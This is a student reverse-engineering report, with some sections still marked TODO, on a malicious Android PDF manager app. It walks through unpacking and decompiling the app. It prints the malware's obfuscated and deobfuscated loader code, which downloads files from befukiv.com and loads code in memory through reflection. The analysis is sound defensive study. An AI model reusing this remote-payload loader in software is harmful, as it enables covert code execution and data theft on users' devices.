---
geometry: margin=25mm
title: RE - PDF Manager
author: Tiago Silvestre - 103554, David Araújo - 93444
date: March 8, 2024
---

# Table of Contents
1. [Introduction](#introduction)
2. [Environment and Tools](#environment-and-tools)
3. [Exploration Steps](#exploration-steps)
4. [Conclusions](#conclusions) 

# Introduction

For our reverse engineering course, we have decided to analyze and reverse engineer the "PDF Reader File Manager" application, which was known for being removed from the Play Store earlier this year. It was developed to steal data from Android users, as explained in this article [here](https://www.tomsguide.com/computing/malware-adware/these-malicious-android-malware-apps-were-downloaded-150000-times-from-the-play-store-delete-them-right-now).

# Environment and Tools

## Environment
To explore this application, we first focused on using a **secure environment** where we could ensure that the finding **wouldn't harm** the host system, and prevent the **system from tainting** any of the possible findings.

We used Vagrant to setup a [Kali box](https://app.vagrantup.com/kalilinux/boxes/rolling) where we could import the provided raw files for evaluation. Also [REMnux Docker container](https://docs.remnux.org/install-distro/remnux-as-a-container) was used for further forensic exploration.

## Tools

[TODO]

# Exploration Steps & Findings

## Unpack

Unziping the file with `7za PDF_Reader_File_Manager.zip` results in the files and directory shown bellow.

![From the zip archive](./imgs/Screenshot%20from%202024-03-08%2017-30-10.png)

With a little investigation we can discover that XAPK files are just a bundle of an APKs with other files. To retrieve these we can again use `7za` and run it with the XAPK file. E now have multiple APKs, a PNG and a JSON file.

![Extracted files](./imgs/Screenshot%20from%202024-03-05%2000-41-49.png)

When trying to run `apktool d 1.apk` or `jadx -d out 1.apk`, we are confronted with some error. This does not happen with any other APK, so inspecting the file signatures, e can find out that **1.apk is not actually an APK** file.

![APK files signatures](./imgs/Screenshot%20from%202024-03-08%2017-40-55.png)

Indeed, if we try to unzip the file, we are able to retrieve multiple files.

![Inside the 1.apk](./imgs/Screenshot%20from%202024-03-08%2017-45-52.png)

## Decompiling

We now have a large set of files from the application, however, many of then are not relevant for what we are trying to achieve and can blur our view over the whole of the application. 

From all of the APKs found, e first focus on the _com.tragisoap.fileandpdfmanager.apk_ has it probably is the main application, and if anything malicious is to happen, it should first come from here.

Using `apktool`, we can expose the the inner contents of the bundle. To do this we can use the following command:

```bash
apktool d -r -s com.tragisoap.fileandpdfmanager.apk
```

From this, the most important file is the _classes.dex_ file, from which we can reassemble the Java class files. To do this we can use `jadx` with the command:

```bash
jadx -d out classes.dex
```

## Walkthrough

TODO: Finding initial point of application and trace it back to download of malware

### Exploring Application External Accesses

Given that the application contains malware, it's probable that at some point it downloads additional files from external services. We decided to search the codebase for URLs in the 'https://' format. And we found the following Java function.

```java
    public static void a() {
        String str;
        y4.p pVar = new y4.p();
        r.a aVar = new r.a();
        aVar.c("https://befukiv.com/muchaspuchas");
        y4.r a7 = aVar.a();
        r.a aVar2 = new r.a();
        aVar2.c("https://befukiv.com/cortina");
        y4.r a8 = aVar2.a();
        try {
            y4.t tVar = new y4.d(pVar, a7).a().f6804g;
            byte[] b2 = tVar.b();
            y4.o e7 = tVar.e();
            Charset charset = z4.h.f6957c;
            if (e7 != null && (str = e7.f6764b) != null) {
                charset = Charset.forName(str);
            }
            f3837g.set(new String(b2, charset.name()).split("\\|"));
            byte[] b7 = new y4.d(pVar, a8).a().f6804g.b();
            if (f3839i.get()) {
                return;
            }
            f3838h.getClass();
            g6.i.h(b7);
            f3839i.set(true);
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
```

Although it's obfuscated, we can see that it's accessing files from the domain **befukiv.com**. A DNS search reveals that this domain has two name servers pointing to domains in Russia.

```
...
Registrant Email: http://whois.nicenic.net/?page=whoisform
Admin Email: http://whois.nicenic.net/?page=whoisform&emailtype=admin
Tech Email: http://whois.nicenic.net/?page=whoisform&emailtype=tech
Name Server: NS1.ERANS.RU
Name Server: NS2.ERANS.RU
DNSSEC: unsigned
...
```

At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response).

But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.

### Exploring 'muchaspuchas' and 'cortina' files

The 'muchaspuchas' file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.

```
dalvik.system.InMemoryDexClassLoader|getClassLoader|loadClass|com.travisscott.pdf.MainLibrary|...
```

Given that information, we may assume that Java code is parsing these names and then calling them through reflection.

## Exploring readable files

We can see that inside function a() (obfuscated) a string is being splitted by '|' character. To make it more clear we did some deofuscation and achieved the following result

```
public static void fetchFilesAndProcess() {
        String str;
        Session session = new Session();
        HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
        getrequest.request("https://befukiv.com/muchaspuchas");
        HttpHandler call = getrequest.call();
        HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
        getrequest2.request("https://befukiv.com/cortina");
        HttpHandler call2 = getrequest2.call();
        try {
            ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
            byte[] parse = parseHttpResponseBody.parse();
            TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
            Charset charset = z4.h.utf8Charset;
            if (twoStrings != null && (str = twoStrings.secondStr) != null) {
                charset = Charset.forName(str);
            }
            muchasStrings.set(new String(parse, charset.name()).split("\\|"));
            byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
            if (fetchAndProcessCompleted.get()) {
                return;
            }
            fw.getClass();
            FileWriter.mapMuchasStringsToMethods(parse2);
            fetchAndProcessCompleted.set(true);
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
```

As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
This shows that authors wanted to obfuscate application method calls with reflection.


TODO
1. muchaspuchas maybe a CSV type file
2. Based on 1., we look for split functions.



Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.